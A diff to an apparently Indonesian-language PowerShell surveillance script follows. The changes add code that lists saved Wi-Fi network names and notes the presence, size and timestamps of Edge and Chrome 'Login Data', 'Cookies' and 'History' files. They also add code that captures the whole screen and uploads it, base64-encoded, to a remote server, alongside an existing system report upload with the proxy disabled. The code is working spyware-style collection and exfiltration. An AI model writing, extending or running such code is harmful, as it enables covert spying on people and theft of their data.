@@ -106,6 +106,40 @@ function Get-SystemReport {
         [void]$out.AppendLine("(tidak bisa membaca koneksi: $($_.Exception.Message))")
     }
 
+    [void]$out.AppendLine("=== WIFI PROFILES TERSIMPAN ===")
+    try {
+        $raw = netsh wlan show profiles
+        $raw | Select-String "All User Profile|Profil Semua Pengguna" | ForEach-Object {
+            $ssid = ($_ -split ":", 2)[1].Trim()
+            if ($ssid) { [void]$out.AppendLine("SSID : $ssid") }
+        }
+    } catch {
+        [void]$out.AppendLine("(gagal baca wifi: $($_.Exception.Message))")
+    }
+
+    [void]$out.AppendLine("=== DATA BROWSER (Edge/Chrome) ===")
+    try {
+        $paths = @(
+            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default",
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+        )
+        foreach ($bp in $paths) {
+            if (Test-Path $bp) {
+                $short = $bp.Substring($env:LOCALAPPDATA.Length + 1)
+                [void]$out.AppendLine("-- $short --")
+                foreach ($f in @("History", "Login Data", "Cookies", "Preferences")) {
+                    $fp = Join-Path $bp $f
+                    if (Test-Path $fp) {
+                        $i = Get-Item $fp
+                        [void]$out.AppendLine("$f | $([math]::Round($i.Length/1KB,1)) KB | terakhir $($i.LastWriteTime.ToString('yyyy-MM-dd HH:mm'))")
+                    }
+                }
+            }
+        }
+    } catch {
+        [void]$out.AppendLine("(gagal baca browser: $($_.Exception.Message))")
+    }
+
     [void]$out.AppendLine("=== FILE USER ===")
     try {
         $targets = @(
@@ -144,6 +178,23 @@ function Get-SystemReport {
     return $out.ToString()
 }
 
+function Get-ScreenshotB64 {
+    try {
+        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+        $b = [System.Windows.Forms.SystemInformation]::VirtualScreen
+        $bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height
+        $g = [System.Drawing.Graphics]::FromImage($bmp)
+        $g.CopyFromScreen($b.X, $b.Y, 0, 0, $b.Size)
+        $ms = New-Object System.IO.MemoryStream
+        $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
+        $b64 = [Convert]::ToBase64String($ms.ToArray())
+        $g.Dispose(); $bmp.Dispose(); $ms.Dispose()
+        return $b64
+    } catch {
+        return $null
+    }
+}
+
 $wc = New-Object System.Net.WebClient
 $wc.Proxy = $null
 
@@ -161,4 +212,19 @@ try {
     Write-Host "[+] Laporan sistem terkirim, server membalas: $resp"
 } catch {
     Write-Host "[!] Gagal kirim laporan: $($_.Exception.Message)"
+}
+
+$shot = Get-ScreenshotB64
+if ($shot) {
+    try {
+        $wc2 = New-Object System.Net.WebClient
+        $wc2.Proxy = $null
+        $wc2.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+        $resp = $wc2.UploadString($Base + "/", "type=screenshot&data=" + [uri]::EscapeDataString($shot))
+        Write-Host "[+] Screenshot terkirim, server membalas: $resp"
+    } catch {
+        Write-Host "[!] Gagal kirim screenshot: $($_.Exception.Message)"
+    }
+} else {
+    Write-Host "[!] Screenshot gagal diambil (butuh sesi desktop aktif)."
 }
